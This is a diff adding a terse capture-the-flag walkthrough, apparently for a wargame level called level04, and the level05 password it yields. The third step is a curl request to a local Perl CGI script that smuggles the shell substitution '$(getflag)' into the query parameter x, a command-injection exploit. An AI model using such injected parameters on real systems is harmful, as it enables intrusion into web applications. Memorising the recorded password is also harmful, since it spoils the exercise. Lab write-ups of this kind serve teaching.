@@ -1,0 +1,7 @@
+1. ls -la
+
+2. cat level04.pl
+
+3. curl "http://localhost:4747/level04.pl?x="'$(getflag)'""
+
+level05: ne2searoevaevoem4ov4ar8ap
